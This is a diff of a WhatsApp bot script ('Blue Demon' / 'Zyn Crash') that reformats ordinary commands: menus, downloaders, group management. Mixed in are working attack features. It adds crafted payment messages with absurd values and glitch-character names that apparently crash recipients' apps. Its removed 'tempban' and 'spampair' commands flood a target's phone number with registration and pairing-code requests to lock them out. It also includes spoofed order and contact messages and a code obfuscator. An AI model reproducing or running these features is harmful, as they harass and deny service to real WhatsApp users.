+                } : {})
+            },
+            'message': {
+                "interactiveMessage": {
+                    "header": {
+                        "hasMediaAttachment": true,
+                        "jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
+                    },
+                    "nativeFlowMessage": {
+                        "buttons": [{
+                            "name": "review_and_pay",
+                            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+                        }]
+                    }
+                }
+            }
+        }
+
+        const Porke2 = {
+            key: {
+                participant: `0@s.whatsapp.net`,
+                ...(m.chat ? {
+                    remoteJid: "status@broadcast"
+                } : {})
+            },
+            'message': {
+                "interactiveMessage": {
+                    "header": {
+                        "hasMediaAttachment": true,
+                        "jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
+                    },
+                    "nativeFlowMessage": {
+                        "buttons": [{
+                            "name": "review_and_pay",
+                            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+                        }]
+                    }
+                }
+            }
+        }
+
+        let list = []
+        for (let i of ownerNumber) {
+            list.push({
+                displayName: await zyn.getName(i + '@s.whatsapp.net'),
+                vcard: `BEGIN:VCARD\n
 VERSION:3.0\n
 N:${await zyn.getName(i + '@s.whatsapp.net')}\n
 FN:${await zyn.getName(i + '@s.whatsapp.net')}\n
@@ -423,28 +460,28 @@ item3.X-ABLabel:YouTube\n
 item4.ADR:;;Indonesia;;;;\n
 item4.X-ABLabel:Region\n
 END:VCARD`
-})
-}
+            })
+        }
 
-function monospace(string) {
-return '```' + string + '```'
-}
+        function monospace(string) {
+            return '```' + string + '```'
+        }
 
-   function toRupiah(angka) {
-var saldo = '';
-var angkarev = angka.toString().split('').reverse().join('');
-for (var i = 0; i < angkarev.length; i++)
-if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
-return '' + saldo.split('', saldo.length - 1).reverse().join('');
-}
- 
-// Gak Usah Di Apa Apain Jika Tidak Mau Error
-try {
-ppuser = await zyn.profilePictureUrl(m.sender, 'image')
-} catch (err) {
-ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
-}
-async function spotifydl(url) {
+        function toRupiah(angka) {
+            var saldo = '';
+            var angkarev = angka.toString().split('').reverse().join('');
+            for (var i = 0; i < angkarev.length; i++)
+                if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
+            return '' + saldo.split('', saldo.length - 1).reverse().join('');
+        }
+
+        // Gak Usah Di Apa Apain Jika Tidak Mau Error
+        try {
+            ppuser = await zyn.profilePictureUrl(m.sender, 'image')
+        } catch (err) {
+            ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+        }
+        async function spotifydl(url) {
             return new Promise(async (resolve, reject) => {
                 try {
                     const kemii = await axios.get(
@@ -533,101 +570,104 @@ async function spotifydl(url) {
                 throw 'An error occurred while obtaining Spotify access token.';
             }
         }
-              async function autoViewStatus() {
-                    if (autoswview) {
-                        // Fetch the list of statuses
-                        let statusList = await zyn.fetchStatusUpdates();
-                        for (let status of statusList) {
-                            // Automatically view each status
-                            await zyn.readStatus(status.id);
-                        }
-                    }
+        async function autoViewStatus() {
+            if (autoswview) {
+                // Fetch the list of statuses
+                let statusList = await zyn.fetchStatusUpdates();
+                for (let status of statusList) {
+                    // Automatically view each status
+                    await zyn.readStatus(status.id);
                 }
-                
-// FUNCTION OBFUSCATOR 
-async function obfus(query) {
-return new Promise((resolve, reject) => {
-try {
-const obfuscationResult = jsobfus.obfuscate(query,
-{
-compact: false,
-controlFlowFlattening: true,
-controlFlowFlatteningThreshold: 1,
-numbersToExpressions: true,
-simplify: true, 
-stringArrayShuffle: true,
-splitStrings: true,
-stringArrayThreshold: 1
-}
-);
-const result = {
-status: 200,
-author: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
-result: obfuscationResult.getObfuscatedCode()
-}
-resolve(result)
-} catch (e) {
-reject(e)
-}
-})
-}
- 
-//Status
-if (!zyn.public) {
-if (!m.key.fromMe) return
-} 
+            }
+        }
 
-async function loading () {
-var baralod = [
-"Ɑ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ",
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"*_LOADING_*",
-"*_SUKSSES FULL TO KUNTUL VERSION [3.0]_*", 
-]
-let { key } = await zyn.sendMessage(from, {text: '𝐑'})
+        // FUNCTION OBFUSCATOR 
+        async function obfus(query) {
+            return new Promise((resolve, reject) => {
+                try {
+                    const obfuscationResult = jsobfus.obfuscate(query, {
+                        compact: false,
+                        controlFlowFlattening: true,
+                        controlFlowFlatteningThreshold: 1,
+                        numbersToExpressions: true,
+                        simplify: true,
+                        stringArrayShuffle: true,
+                        splitStrings: true,
+                        stringArrayThreshold: 1
+                    });
+                    const result = {
+                        status: 200,
+                        author: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
+                        result: obfuscationResult.getObfuscatedCode()
+                    }
+                    resolve(result)
+                } catch (e) {
+                    reject(e)
+                }
+            })
+        }
 
-for (let i = 0; i < baralod.length; i++) {
-await zyn.sendMessage(from, {text: baralod[i], edit: key });
-}
-}
-        
+        //Status
+        if (!zyn.public) {
+            if (!m.key.fromMe) return
+        }
 
-// Fake Resize
-const fkethmb = await reSize(ppuser, 300, 300)
+        async function loading() {
+            var baralod = [
+                "Ɑ͞ ̶͞ ̶͞ඩ",
+                "Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ",
+            ]
+            let {
+                key
+            } = await zyn.sendMessage(from, {
+                text: '𝐑'
+            })
 
-// Cuma Fake
-const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
-const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
-"orderMessage": {
-"orderId": orid,
-"thumbnail": img,
-"itemCount": itcount,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"orderTitle": title,
-"message": text,
-"sellerJid": sellers,
-"token": tokens,
-"totalAmount1000": ammount,
-"totalCurrencyCode": "IDR",
-}
-}), { userJid: jid, quoted: m })
-zyn.relayMessage(jid, order.message, { messageId: order.key.id})
-}
-const bluereply = (teks) => {
+            for (let i = 0; i < baralod.length; i++) {
+                await zyn.sendMessage(from, {
+                    text: baralod[i],
+                    edit: key
+                });
+            }
+        }
+
+
+        // Fake Resize
+        const fkethmb = await reSize(ppuser, 300, 300)
+
+        // Cuma Fake
+        const sendOrder = async (jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
+            const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
+                "orderMessage": {
+                    "orderId": orid,
+                    "thumbnail": img,
+                    "itemCount": itcount,
+                    "status": "INQUIRY",
+                    "surface": "CATALOG",
+                    "orderTitle": title,
+                    "message": text,
+                    "sellerJid": sellers,
+                    "token": tokens,
+                    "totalAmount1000": ammount,
+                    "totalCurrencyCode": "IDR",
+                }
+            }), {
+                userJid: jid,
+                quoted: m
+            })
+            zyn.relayMessage(jid, order.message, {
+                messageId: order.key.id
+            })
+        }
+        const bluereply = (teks) => {
             zyn.sendMessage(from, {
                 text: teks
             }, {
                 quoted: m
             })
         }
-// Function Reply
-const reply = (teks) => {
+        // Function Reply
+        const reply = (teks) => {
             zyn.sendMessage(m.chat, {
                 text: teks,
                 contextInfo: {
@@ -640,7 +680,7 @@ const reply = (teks) => {
                         "title": `ʙʟᴜᴇ ᴄʀᴀꜱʜᴇʀ`,
                         "body": `${ucapanWaktu} ${pushname}`,
                         "previewType": "PHOTO",
-                        "thumbnailUrl": `https://l.top4top.io/s_32188bbq00.jpg`, // Replace with your image URL
+                        "thumbnailUrl": `https://l.top4top.io/s_32310ywi80.jpeg`, // Replace with your image URL
                         "thumbnail": null, // You can set this to null since you are using thumbnailUrl
                         "sourceUrl": `${isLink}`
                     }
@@ -650,23 +690,47 @@ const reply = (teks) => {
             });
         }
 
-const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
-function parseMention(text = '') {
-return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
-}
-    
-if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
-if (!isBotAdmins) return
-if (budy.match(`whatsapp.com`)) {
-zyn.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
-zyn.groupParticipantsUpdate(m.chat, [sender], 'delete')
-zyn.sendMessage(m.chat, { delete: m.key })
-}
-}
+        const fkontak = {
+            key: {
+                fromMe: false,
+                participant: `0@s.whatsapp.net`,
+                ...(from ? {
+                    remoteJid: "status@broadcast"
+                } : {})
+            },
+            message: {
+                'contactMessage': {
+                    'displayName': `${pushname}`,
+                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
+                    'jpegThumbnail': {
+                        url: 'https://g.top4top.io/p_3194iz70l0.jpg'
+                    }
+                }
+            }
+        }
 
-switch (command) {
+        function parseMention(text = '') {
+            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
+        }
 
-case 'menu': {
+        if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
+            if (!isBotAdmins) return
+            if (budy.match(`whatsapp.com`)) {
+                zyn.sendMessage(m.chat, {
+                    text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`
+                }, {
+                    quoted: m
+                })
+                zyn.groupParticipantsUpdate(m.chat, [sender], 'delete')
+                zyn.sendMessage(m.chat, {
+                    delete: m.key
+                })
+            }
+        }
+
+        switch (command) {
+
+            case 'menu': {
                 darkphonk = fs.readFileSync('./database/Phonk.mp3')
                 const version = require("baileys/package.json").version;
                 const menu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
@@ -746,7 +810,7 @@ case 'menu': {
                 })
             }
             break
-case 'bluemenu':
+            case 'bluemenu':
             case 'allmenu': {
                 const version = require("baileys/package.json").version;
                 let run = runtime(process.uptime());
@@ -903,7 +967,7 @@ case 'bluemenu':
                 });
             }
             break;
-case 'specialmenu': {
+            case 'specialmenu': {
                 const version = require("baileys/package.json").version;
                 let run = runtime(process.uptime());
 
@@ -999,7 +1063,7 @@ case 'specialmenu': {
                 reply(`Number ${ya} has been removed from Premium!`);
             }
             break;
-case "addowner":
+            case "addowner":
                 if (!isOwner) return reply(mess.only.owner)
                 if (!args[0]) return reply(`Usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
@@ -1009,7 +1073,7 @@ case "addowner":
                 fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                 reply(`${bnnd} Has become an owner!!!`)
                 break
-case "delowner":
+            case "delowner":
                 if (!isOwner) return reply(mess.only.owner)
                 if (!args[0]) return reply(`usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                 ya = q.split("|")[0].replace(/[^0-9]/g, '')
@@ -1018,8 +1082,8 @@ case "delowner":
                 fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                 reply(`${ya} Has Been Deleted by Owner!!!`)
                 break
-            
-case 'gclink':
+
+            case 'gclink':
             case 'grouplink':
             case 'gruplink': {
                 if (!m.isGroup) return reply(mess.only.group);
@@ -1089,7 +1153,7 @@ case 'gclink':
                 bluereply(mess.success);
             }
             break;
-case 'getowner': {
+            case 'getowner': {
                 if (!isOwner) return reply(mess.only.owner);
 
                 // Read the owner list from the JSON file
@@ -1112,7 +1176,7 @@ case 'getowner': {
                 reply(ownerMessage);
             }
             break;
-case 'getprem': {
+            case 'getprem': {
                 if (!isOwner) return reply(mess.only.owner);
 
                 // Read the premium list from the JSON file
@@ -1137,7 +1201,7 @@ case 'getprem': {
                 await zyn.sendText(m.chat, premiumMessage, m);
                 break;
             }
-case "delowner":
+            case "delowner":
                 if (!isOwner) return reply(mess.only.owner)
                 if (!args[0]) return reply(`usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                 ya = q.split("|")[0].replace(/[^0-9]/g, '')
@@ -1146,19 +1210,19 @@ case "delowner":
                 fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                 reply(`${ya} Has Been Deleted by Owner!!!`)
                 break
-case 'public': {
+            case 'public': {
                 if (!isOwner) return reply(mess.only.owner)
                 zyn.public = true
                 reply(' *\`Public mode activated\`* ')
             }
             break
-case 'self': {
+            case 'self': {
                 if (!isOwner) return reply(mess.only.owner)
                 zyn.public = false
                 reply(' *\`Private mode activated\`* ')
             }
             break
-case 'ping': {
+            case 'ping': {
                 // Capture the start time for ping calculation
                 const startTime = performance.now();
 
@@ -1183,7 +1247,7 @@ case 'ping': {
                 }, {});
             }
             break;
-case 'unblock': {
+            case 'unblock': {
                 if (!isOwner) return reply(mess.only.group);
 
                 let users;
@@ -1210,7 +1274,7 @@ case 'unblock': {
                 }
                 break;
             }
-case 'mode': {
+            case 'mode': {
                 // Check if the user has the right to change the mode (Only creator or bot owner)
                 if (!isOwner) return reply(mess.only.owner);
 
@@ -1228,7 +1292,7 @@ case 'mode': {
                 }
             }
             break;
-case 'delete':
+            case 'delete':
             case 'del':
             case 'd': {
                 if (!isOwner) return reply(mess.only.owner)
@@ -1247,8 +1311,8 @@ case 'delete':
                     // No response or error logging
                 }
             }
-break
-case 'join': {
+            break
+            case 'join': {
                 if (!isOwner) return reply(mess.owner); // Check if the user is the owner
                 if (!text) return reply('Enter Group Link!');
                 if (!isUrl(text) || !text.includes('whatsapp.com')) return reply('Invalid Link!');
@@ -1281,7 +1345,7 @@ case 'join': {
                 }
                 break;
             }
-case 'setbio':
+            case 'setbio':
             case 'setbotbio': {
                 if (!isOwner) return reply(mess.only.owner);
                 if (!q) return reply(`*TEXT*`);
@@ -1291,13 +1355,13 @@ case 'setbio':
                 reply(`*Bio has been changed to ${q}*`);
             }
             break;
-case 'restart':
+            case 'restart':
                 if (!isOwner) return reply(mess.only.owner)
                 reply(`*RESTARTING 𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍*`)
                 await sleep(3000)
                 process.exit()
                 break
-           case 'tiktok':
+            case 'tiktok':
             case 'tt': {
                 if (!text) return reply(`Example: ${prefix + command} link`);
                 bluereply(mess.wait);
@@ -1338,8 +1402,8 @@ case 'restart':
                     })
                 }
                 break;
-            }  
-        case 'fb':
+            }
+            case 'fb':
             case 'facebook':
             case 'facebookvid': {
                 if (!text) return reply(`Please send a Facebook video link\n\nEXAMPLE :\n*${prefix + command}* https://fb.watchvhgjhz`)
@@ -1360,8 +1424,8 @@ case 'restart':
                     reply('*AN ERROR OCCURED*')
                 }
             }
-            break        
-case 'instagram':
+            break
+            case 'instagram':
             case 'igdl':
             case 'ig':
             case 'igvideo':
@@ -1391,7 +1455,7 @@ case 'instagram':
                 }
             }
             break
-case 'yts':
+            case 'yts':
             case 'ytsearch': {
                 if (!text) return reply(`Example : ${prefix + command} Demon slayer`);
                 bluereply(mess.wait);
@@ -1414,7 +1478,7 @@ case 'yts':
                 });
                 break;
             }
-case 'spotify':
+            case 'spotify':
             case 'play':
             case 'song': {
                 if (!text) return reply('Enter the song title!')
@@ -1469,7 +1533,7 @@ case 'spotify':
                 });
             }
             break
-case 'spdl':
+            case 'spdl':
             case 'spotifydl': {
                 if (!text) return reply('Enter Link')
                 let result = await spotifydl(text)
@@ -1501,7 +1565,7 @@ case 'spdl':
                 });
             }
             break
-case 'ytvideo':
+            case 'ytvideo':
             case 'ytmp4': {
                 if (!text) return reply(' [ Example ] :*\n> *.ytmp4 <link youtube>*')
                 bluereply(mess.wait)
@@ -1526,7 +1590,7 @@ case 'ytvideo':
                 }
             }
             break
-case 'lirik':
+            case 'lirik':
             case 'lyrics': {
                 try {
                     if (!text) return reply(`What lyrics are you looking for?\nExample usage: ${prefix}lyrics Thunder`);
@@ -1602,7 +1666,7 @@ case 'lirik':
                 }
                 break;
             }
-case 'update': {
+            case 'update': {
                 if (!isOwner) return reply(mess.only.owner);
 
                 reply("*𝐔𝐏𝐃𝐀𝐓𝐈𝐍𝐆 𝐃𝐄𝐌𝐎𝐍 𝐁𝐎𝐓....*");
@@ -1628,7 +1692,7 @@ case 'update': {
 
                 break;
             }
-  case 'svcontact': {
+            case 'svcontact': {
                 if (!m.isGroup) return reply(mess.only.group);
                 bluereply(mess.wait);
                 try {
@@ -1665,7 +1729,7 @@ case 'update': {
 
                 break;
             }
-case 'tag':
+            case 'tag':
             case 'hidetag': {
                 if (!m.isGroup) return reply(mess.only.group);
 
@@ -1692,9 +1756,9 @@ case 'tag':
 
                 break;
             }
-case 'tagall': {
+            case 'tagall': {
                 if (!m.isGroup) return reply(mess.only.group);
-                if (!isOwner && !iisAdmin) return reply(mess.only.admin);
+                if (!isOwner && !isAdmin) return reply(mess.only.admin);
 
                 // Check if the sender is the owner
                 if (!isOwner) return reply(mess.only.owner);
@@ -1726,7 +1790,7 @@ case 'tagall': {
                 });
             }
             break;
-case 'add': {
+            case 'add': {
                 if (!m.isGroup) return reply(mess.only.group);
 
                 if (!isAdmins) return reply(mess.only.admin);
@@ -1742,7 +1806,7 @@ case 'add': {
                 try {
                     // Attempt to add the user to the group
                     await zyn.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
-                  bluereply(mess.success);
+                    bluereply(mess.success);
                 } catch (err) {
                     // Handle potential errors
                     console.error('Error adding user:', err);
@@ -1750,7 +1814,7 @@ case 'add': {
                 }
             }
             break;
-case "kick": {
+            case "kick": {
                 if (!isGroup) return reply(mess.only.group);
 
                 if (!isAdmins && !isOwner) return reply(mess.only.admin);
@@ -1770,7 +1834,7 @@ case "kick": {
                 }
             }
             break;
-case "promote": {
+            case "promote": {
                 if (!isGroup) return reply(mess.only.group);
 
                 if (!isAdmins && !isOwner) return reply(mess.only.admin);
@@ -1790,7 +1854,7 @@ case "promote": {
                 }
             }
             break;
-case "demote": {
+            case "demote": {
                 if (!isGroup) return reply(mess.only.group);
                 if (!isAdmins && !isOwner) return reply(mess.only.admin);
                 if (!isBotAdmins) return reply(mess.only.badmin);
@@ -1811,7 +1875,7 @@ case "demote": {
                 }
             }
             break;
-case 'mute': {
+            case 'mute': {
                 // Check if the command is being used in a group
                 if (!m.isGroup) return reply(mess.group);
 
@@ -1851,7 +1915,7 @@ case 'mute': {
                 }
                 break;
             }
-case 'invite': {
+            case 'invite': {
                 if (!m.isGroup) return reply(mess.only.grouo);
                 if (!isBotAdmins) return reply(mess.only.admin);
                 if (!text) return reply(`Enter the number you want to invite to the group.\n\nExample:\n*${prefix + command}* 255734980103`);
@@ -1872,14 +1936,14 @@ case 'invite': {
                 }
                 break;
             }
-case 'leavegc': {
+            case 'leavegc': {
                 if (!isOwner) return reply(mess.only.owner);
                 await zyn.groupLeave(m.chat)
                     .then((res) => reply(JSON.stringify(res)))
                     .catch((err) => reply(JSON.stringify(err)));
                 break;
             }
-case 'closegroup':
+            case 'closegroup':
             case 'closegc': {
                 if (!isGroup) return reply(mess.only.group);
 
@@ -1917,7 +1981,7 @@ case 'closegroup':
                 }, timer);
             }
             break;
-case 'opengroup':
+            case 'opengroup':
             case 'opengc': {
                 if (!isGroup) return reply(mess.only.group);
 
@@ -1955,7 +2019,7 @@ case 'opengroup':
                 }, timer);
             }
             break;
-case 'vv': {
+            case 'vv': {
                 if (!m.quoted) return reply('Please reply to a view-once message.');
                 if (m.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message.');
 
@@ -1985,7 +2049,7 @@ case 'vv': {
                 }
             }
             break;
-case 'ai': {
+            case 'ai': {
                 if (!text) return reply(`*• Example:* ${prefix + command} Who was the person who discovered the computer in the Majapahit era?`);
                 await zyn.sendMessage(m.chat, {
                     react: {
@@ -2045,15 +2109,15 @@ case 'ai': {
                 }
             }
             break
-        case 'enc':
+            case 'enc':
             case 'encrypt':
             case 'obfuscate': {
                 if (!q) return reply(`Example ${prefix+command} const time = require('money')`)
                 let meg = await obfus(q)
                 reply(`${meg.result}`)
             }
-            break    
-case 'getsession': {
+            break
+            case 'getsession': {
                 // Check if the sender is the owner
                 const ownerNumber = '2347041039367@s.whatsapp.net'; // Replace with your WhatsApp owner number
                 if (m.sender !== ownerNumber) return reply('ꜱᴏʀʀy, ᴏɴʟy ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');
@@ -2081,7 +2145,7 @@ case 'getsession': {
                 }
                 break;
             }
-case 'avs':
+            case 'avs':
             case 'autostatus': {
                 // Check if the user is the owner of the bot
                 if (!isOwner) return reply(mess.owner);
@@ -2104,7 +2168,7 @@ case 'avs':
 
             // Call autoViewStatus function at an appropriate place in your code
             autoViewStatus();
-case 'listblock': {
+            case 'listblock': {
                 // Check if the user is the owner or a premium user
                 if (!isOwner && !isPremium) {
                     return reply(mess.only.premium);
@@ -2127,7 +2191,7 @@ case 'listblock': {
                 }
                 break;
             }
-case 'time': {
+            case 'time': {
                 // Define `time2` to get the current tim
                 const newtime = `*𝗧𝗜𝗠𝗘*\n*${time2}*`;
                 bluereply(newtime);
@@ -2141,12 +2205,12 @@ case 'time': {
                 reply(lowq);
             }
             break;
-  case 'totalcase':
+            case 'totalcase':
             case 'totalcmd':
             case 'totalcommand':
                 reply(`*Hey* *${pushname}* *${botname}* *has total features of* *${nanototalpitur()}*`)
                 break
-case 'getip':
+            case 'getip':
             case 'ip': {
                 if (!isOwner) return reply(mess.only.owner);
                 try {
@@ -2174,790 +2238,759 @@ case 'getip':
                 }
                 break;
             }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-case 'infono': {
-if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
-if (!q) return reply(' Enter the Target number Prefix "+" and Country Code')
-await zyn.sendMessage(m.chat, {text: `informasi kontak
-Name : ${m.pushName}
-Number : ${q}
-Status : *${zyn ? '✅' : `❌`}*`},{quoted: m})
-}
-break
-
-
-
-case 'tempban': {
-if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
-if (!text) return reply(`Example: ${prefix + command} 62|8xxx`)
-if (!/|/.test(text)) return reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
-let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))
-
-let cCode = q.split("|")[0]
-let number = q.split("|")[1]
-let fullNo = cCode + number
-
-await reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)
-
-let { state, saveCreds } = await useMultiFileAuthState('tb')
-
-let spam = makeWaSocket({
-auth: state,
-mobile: true,
-logger: pino({ level: 'silent' })
-})
-
-let dropNumber = async () => {
-try {
-let res = await spam.requestRegistrationCode({
-phoneNumber: `+${fullNo}`,
-phoneNumberCountryCode: cCode,
-phoneNumberNationalNumber: number,
-phoneNumberMobileCountryCode: 724,
-})
-
-if (res.reason === 'temporarily_unavailable') {
-console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
-await sleep(1000)
-await dropNumber()
-}
-} catch (error) {
-console.error(error)
-}
-}
-
-numbers[fullNo] = { cCode, number };
-fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'));
-setInterval(() => {
-dropNumber()
-}, 400)
-}
-break
-
-case 'spampair': {
-const usePairingCode = true
-const NodeCache = require("node-cache")
-const resolveMsgBuffer = new NodeCache()
-			if (!isOwner) return
-			if (!q) return reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx_`)
-			let [peenis, pepekk = "200"] = q.split("|")
-			await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
-			await reaction(m.chat, "✅")
-			let target = peenis.replace(/[^0-9]/g, '').trim()
-			let {
-				default: makeWaSocket,
-				useMultiFileAuthState,
-				fetchLatestBaileysVersion
-			} = require('@whiskeysockets/baileys')
-			let {
-				state
-			} = await useMultiFileAuthState('pairSess')
-			let {
-				version
-			} = await fetchLatestBaileysVersion()
-			let sucked = await makeWaSocket({
-				auth: state,
-				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
-version: [2, 2413, 1],
-keepAliveIntervalMs: 50000,
-printQRInTerminal: !usePairingCode,
-generateHighQualityLinkPreview: true,
-resolveMsgBuffer,
-				logger: pino({ level: "silent" }),
-					level: 'fatal'
-				})
-			for (let i = 0; i < pepekk; i++) {
-			await sleep(2000)
-				let prc = await sucked.requestPairingCode(target)
-				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
-			}
-			await sleep(2000)
-		}
-		break
-
-case 'antibugon': {
-if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
-global.antibug = true
